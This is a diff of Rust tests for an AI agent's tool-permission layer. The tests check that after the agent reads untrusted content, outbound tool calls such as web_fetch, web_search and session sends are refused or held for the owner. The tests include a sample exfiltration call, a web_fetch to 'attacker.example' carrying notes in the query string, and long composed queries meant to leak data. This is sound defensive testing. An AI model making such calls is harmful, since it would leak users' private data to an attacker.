@@ -382,15 +382,18 @@ async fn an_unattended_tainted_turn_leaves_what_needs_the_owner_for_them() {
         ("write_file", json!({"file_path": "/tmp/x", "content": "y"})),
         ("harness_session_spawn", json!({"harness": "pi"})),
         ("agent_delegate", json!({"goal": "do it"})),
-        (
-            "web_fetch",
-            json!({"url": "https://attacker.example/c?d=notes"}),
-        ),
     ] {
         let (ran, text) = session.call(tool, args).await;
         assert!(!ran, "{tool} ran unasked");
         assert!(text.contains("left for the owner"), "{tool}: {text}");
     }
+    let (ran, text) = session
+        .call(
+            "web_fetch",
+            json!({"url": "https://attacker.example/c?d=notes"}),
+        )
+        .await;
+    assert!(!ran && text.contains("Not fetched"), "{text}");
     let (ran, _) = session.call("vault_read", json!({"path": "a.md"})).await;
     assert!(ran, "reading stays open");
 }
@@ -439,21 +442,31 @@ async fn in_an_owner_chat_a_tainted_fetch_or_send_waits_for_the_owner() {
         .await;
     assert!(ran, "a site the owner named is fetched without asking");
     for (tool, args) in [
-        ("web_fetch", json!({"url": "https://attacker.example/c"})),
+        ("web_fetch", json!({"url": "https://unseen.example/c"})),
         (
             "web_fetch",
             json!({"url": format!("https://blog.example/?d={}", "n".repeat(300))}),
         ),
-        ("web_search", json!({"query": "notes ".repeat(40)})),
-        (
-            "harness_session_send",
-            json!({"session_id": "hs-1", "text": "go"}),
-        ),
+        ("web_search", json!({"query": "notes ".repeat(60)})),
     ] {
         let (ran, text) = session.call(tool, args).await;
-        assert!(!ran, "{tool} ran without the owner");
-        assert!(text.contains("Waiting for the owner"), "{tool}: {text}");
+        assert!(!ran, "{tool} ran composed text out");
+        assert!(
+            text.contains("Not fetched") || text.contains("Not searched"),
+            "refused, never asked: {tool}: {text}"
+        );
     }
+    let (ran, _) = session
+        .call("web_search", json!({"query": "notes ".repeat(40)}))
+        .await;
+    assert!(ran, "a long but ordinary query runs");
+    let (ran, text) = session
+        .call(
+            "harness_session_send",
+            json!({"session_id": "hs-1", "text": "go"}),
+        )
+        .await;
+    assert!(!ran && text.contains("Waiting for the owner"), "{text}");
 }
 
 #[tokio::test]
@@ -477,7 +490,7 @@ async fn a_trusted_domain_skips_the_ask_but_the_fetch_still_taints() {
     ] {
         let (ran, text) = session.call("web_fetch", json!({ "url": url })).await;
         assert!(!ran, "{url} ran without the owner");
-        assert!(text.contains("Waiting for the owner"), "{url}: {text}");
+        assert!(text.contains("Not fetched"), "{url}: {text}");
     }
     let (ran, _) = session
         .call("web_fetch", json!({"url": "https://EXAMPLE.com.:8443/x"}))
@@ -491,5 +504,5 @@ async fn a_trusted_domain_skips_the_ask_but_the_fetch_still_taints() {
     let (ran, text) = session
         .call("web_fetch", json!({"url": "https://example.com/"}))
         .await;
-    assert!(!ran && text.contains("Waiting for the owner"), "{text}");
+    assert!(!ran && text.contains("Not fetched"), "{text}");
 }
